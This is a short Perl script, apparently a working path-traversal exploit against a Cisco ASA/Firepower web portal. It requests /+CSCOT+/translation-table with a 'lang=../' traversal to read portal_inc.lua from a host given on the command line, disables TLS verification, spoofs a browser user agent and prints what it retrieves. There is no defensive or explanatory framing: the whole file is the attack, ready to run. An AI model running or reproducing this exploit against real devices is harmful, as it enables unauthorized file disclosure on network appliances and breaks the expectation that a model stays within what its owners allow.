#!/usr/bin/perl
use Data::Dumper;
use strict;
use utf8;
use Text::Unidecode;
binmode STDOUT, ":encoding(UTF-8)";
use LWP::UserAgent;
use Getopt::Long;
$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;

GetOptions(
    'host=s'    => \my $host,
    'port=i'     => \my $port,    
) or die usage();


sub usage { 
  
  print "Uso:  \n";
  print "Autor: Daniel Torres Sandi \n";
  print " firepower.pl -host 192.168.0.2 -port 80 \n";  
}	



my $browser = LWP::UserAgent->new(ssl_opts => {
    verify_hostname => 0,
    SSL_cipher_list => '',
});

$browser->agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0");
$browser->timeout(25);
$browser->show_progress(0);

$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;


my $uri ;
if ($port == 80)
{
$uri = "http://$host"."/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../";
}
else
{
$uri = "https://$host"."/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../";
}



my $req = HTTP::Request->new( 'GET', $uri );

my $response = $browser->request( $req );
my $content = $response->decoded_content;

print ($content);


